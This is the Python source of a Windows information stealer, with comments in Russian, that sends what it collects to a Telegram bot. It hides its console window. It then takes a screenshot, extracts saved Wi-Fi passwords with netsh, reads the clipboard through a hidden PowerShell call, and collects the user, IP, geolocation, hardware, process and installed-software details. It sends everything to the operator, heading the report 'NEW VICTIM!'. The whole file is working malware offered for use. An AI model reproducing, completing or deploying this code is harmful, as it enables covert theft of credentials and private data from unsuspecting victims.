import socket
from requests import get
import time
import requests as req
import platform
import os
import subprocess
import psutil
from datetime import datetime
import mss
from PIL import Image
import ctypes
import sys

# ========== ТВОИ ДАННЫЕ ==========
BOT_TOKEN = "а"
CHAT_ID = "а"


# =================================

class DataCollector:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.local_ip = socket.gethostbyname(self.hostname)
        self.public_ip = get('http://api.ipify.org').text
        self.temp_dir = os.environ['TEMP']
        self.screenshot_path = os.path.join(self.temp_dir, "screenshot.png")

    def send_telegram(self, message, photo=None, document=None):
        """Универсальная отправка в Telegram"""
        try:
            if photo:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                with open(photo, 'rb') as f:
                    files = {'photo': f}
                    data = {'chat_id': CHAT_ID, 'caption': message[:200]}
                    req.post(url, data=data, files=files, timeout=30)
            elif document:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                with open(document, 'rb') as f:
                    files = {'document': f}
                    data = {'chat_id': CHAT_ID, 'caption': message[:200]}
                    req.post(url, data=data, files=files, timeout=30)
            else:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
                req.post(url, data=data, timeout=30)
        except Exception as e:
            print(f"Ошибка отправки: {e}")

    def get_geo_info(self):
        """Геолокация по IP"""
        try:
            geo = get('http://ip-api.com/json/', timeout=5).json()
            return f"""
📍 <b>ГЕОЛОКАЦИЯ:</b>
🌍 Страна: {geo.get('country', 'Неизвестно')}
🏙️ Город: {geo.get('city', 'Неизвестно')}
🗺️ Регион: {geo.get('regionName', 'Неизвестно')}
📮 Индекс: {geo.get('zip', 'Неизвестно')}
📡 Провайдер: {geo.get('isp', 'Неизвестно')}
📊 Координаты: {geo.get('lat', '?')}, {geo.get('lon', '?')}
"""
        except:
            return "❌ Геолокация не определена"

    def get_system_details(self):
        """Детальная информация о системе"""
        # Информация о видеокарте через wmic
        gpu_info = "Не удалось определить"
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode('utf-8')
                gpus = output.split('\n')[1:-1]
                if gpus and gpus[0].strip():
                    gpu_info = gpus[0].strip()
        except:
            pass

        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('C:\\')

        # Имя пользователя
        username = os.getlogin()

        info = f"""
💻 <b>СИСТЕМА:</b>
👤 Пользователь: {username}
🖥️ Компьютер: {self.hostname}
🌐 Локальный IP: {self.local_ip}
🌍 Публичный IP: {self.public_ip}
⚙️ ОС: {platform.system()} {platform.release()}
🔧 Архитектура: {platform.machine()}
🧠 Процессор: {platform.processor()}
🎮 Видеокарта: {gpu_info}
💾 ОЗУ: {memory.total // (1024 ** 3)}GB (доступно: {memory.available // (1024 ** 3)}GB)
💽 Диск C: {disk.used // (1024 ** 3)}GB / {disk.total // (1024 ** 3)}GB
"""
        return info

    def take_screenshot(self):
        """Скриншот экрана с помощью mss"""
        try:
            with mss.mss() as sct:
                # Скриншот всех мониторов
                monitor = sct.monitors[0]
                screenshot = sct.grab(monitor)

                # Конвертируем и сохраняем
                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                img.save(self.screenshot_path)
                return self.screenshot_path
        except Exception as e:
            print(f"Ошибка скриншота: {e}")
            return None

    def get_wifi_passwords(self):
        """Сохраненные Wi-Fi пароли (Windows)"""
        wifi_file = os.path.join(self.temp_dir, "wifi.txt")
        try:
            if platform.system() == "Windows":
                # Получаем список профилей WiFi
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],
                                               encoding='cp866',
                                               stderr=subprocess.DEVNULL).split('\n')

                profiles = []
                for line in data:
                    if "Все профили пользователей" in line or "User profiles" in line:
                        profile = line.split(":")[1].strip()
                        if profile:
                            profiles.append(profile)

                if not profiles:
                    return None

                with open(wifi_file, 'w', encoding='utf-8') as f:
                    f.write("🔑 НАЙДЕННЫЕ WI-FI ПАРОЛИ:\n")
                    f.write("=" * 50 + "\n\n")

                    for profile in profiles:
                        try:
                            # Получаем пароль для каждого профиля
                            result = subprocess.check_output(
                                ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                encoding='cp866',
                                stderr=subprocess.DEVNULL
                            ).split('\n')

                            password = "Не найден"
                            for line in result:
                                if "Содержимое ключа" in line or "Key Content" in line:
                                    password = line.split(":")[1].strip()
                                    break

                            f.write(f"📡 Сеть: {profile}\n")
                            f.write(f"🔐 Пароль: {password}\n")
                            f.write("-" * 30 + "\n")
                        except:
                            f.write(f"📡 Сеть: {profile}\n")
                            f.write("🔐 Пароль: [Ошибка доступа]\n")
                            f.write("-" * 30 + "\n")

                return wifi_file if os.path.getsize(wifi_file) > 0 else None
        except Exception as e:
            print(f"Ошибка WiFi: {e}")
        return None

    def get_clipboard(self):
        """Содержимое буфера обмена (Windows)"""
        clip_file = os.path.join(self.temp_dir, "clipboard.txt")
        try:
            if platform.system() == "Windows":
                # PowerShell для получения буфера обмена
                ps_command = "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()"
                result = subprocess.check_output(
                    ['powershell', '-command', ps_command],
                    encoding='utf-8',
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).strip()

                if result:
                    with open(clip_file, 'w', encoding='utf-8') as f:
                        f.write("📋 СОДЕРЖИМОЕ БУФЕРА ОБМЕНА:\n")
                        f.write("=" * 50 + "\n\n")
                        f.write(result)
                    return clip_file
        except Exception as e:
            print(f"Ошибка буфера обмена: {e}")
        return None

    def get_process_list(self):
        """Список запущенных процессов"""
        proc_file = os.path.join(self.temp_dir, "processes.txt")
        try:
            with open(proc_file, 'w', encoding='utf-8') as f:
                f.write("⚙️ ЗАПУЩЕННЫЕ ПРОЦЕССЫ:\n")
                f.write("=" * 70 + "\n")
                f.write(f"{'PID':<8} {'Имя процесса':<35} {'CPU%':<8} {'RAM(MB)':<10}\n")
                f.write("=" * 70 + "\n")

                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
                    try:
                        pid = proc.info['pid']
                        name = proc.info['name'][:35] if proc.info['name'] else 'Unknown'
                        cpu = proc.info['cpu_percent'] or 0
                        mem = proc.info['memory_info'].rss / (1024 ** 2) if proc.info['memory_info'] else 0
                        f.write(f"{pid:<8} {name:<35} {cpu:<8.1f} {mem:<10.1f}\n")
                    except:
                        pass
            return proc_file
        except Exception as e:
            print(f"Ошибка процессов: {e}")
        return None

    def get_installed_software(self):
        """Список установленного ПО"""
        software_file = os.path.join(self.temp_dir, "software.txt")
        try:
            if platform.system() == "Windows":
                import winreg

                software_list = []

                # Два основных ключа реестра для 32/64 бит
                reg_paths = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
                ]

                for hkey, path in reg_paths:
                    try:
                        reg_key = winreg.OpenKey(hkey, path, 0, winreg.KEY_READ)
                        for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(reg_key, i)
                                subkey = winreg.OpenKey(reg_key, subkey_name)

                                try:
                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" in [
                                        winreg.EnumValue(subkey, j)[0] for j in
                                        range(winreg.QueryInfoKey(subkey)[1])] else "N/A"
                                    if name:
                                        software_list.append(f"{name} - {version}")
                                except:
                                    pass
                                finally:
                                    winreg.CloseKey(subkey)
                            except:
                                pass
                        winreg.CloseKey(reg_key)
                    except:
                        pass

                if software_list:
                    with open(software_file, 'w', encoding='utf-8') as f:
                        f.write("📦 УСТАНОВЛЕННОЕ ПО:\n")
                        f.write("=" * 50 + "\n\n")
                        for software in sorted(set(software_list)):
                            f.write(f"• {software}\n")
                    return software_file
        except Exception as e:
            print(f"Ошибка получения списка ПО: {e}")
        return None

    def collect_and_send(self):
        """Главная функция - собирает всё и отправляет"""

        print("🚀 Начинаю сбор данных...")

        # 1. Базовая информация
        base_info = f"""
<b>🔥 НОВАЯ ЖЕРТВА! 🔥</b>
🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{self.get_system_details()}
{self.get_geo_info()}
"""
        self.send_telegram(base_info)
        print("✅ Базовая информация отправлена")
        time.sleep(1)

        # 2. Скриншот
        screenshot = self.take_screenshot()
        if screenshot:
            self.send_telegram("📸 Скриншот экрана:", photo=screenshot)
            print("✅ Скриншот отправлен")
        time.sleep(1)

        # 3. WiFi пароли
        wifi = self.get_wifi_passwords()
        if wifi:
            self.send_telegram("🔑 WiFi пароли:", document=wifi)
            print("✅ WiFi пароли отправлены")
        time.sleep(1)

        # 4. Буфер обмена
        clipboard = self.get_clipboard()
        if clipboard:
            self.send_telegram("📋 Буфер обмена:", document=clipboard)
            print("✅ Буфер обмена отправлен")
        time.sleep(1)

        # 5. Процессы
        processes = self.get_process_list()
        if processes:
            self.send_telegram("⚙️ Запущенные процессы:", document=processes)
            print("✅ Список процессов отправлен")
        time.sleep(1)

        # 6. Установленное ПО
        software = self.get_installed_software()
        if software:
            self.send_telegram("📦 Установленное ПО:", document=software)
            print("✅ Список ПО отправлен")

        # 7. Финальное сообщение
        self.send_telegram("✅ <b>СБОР ДАННЫХ ЗАВЕРШЕН!</b>")
        print("🎯 Готово! Все данные отправлены в Telegram")


# Запуск
if __name__ == "__main__":
    # Скрываем окно консоли
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    collector = DataCollector()
    collector.collect_and_send()

    # Небольшая задержка перед закрытием
    time.sleep(2)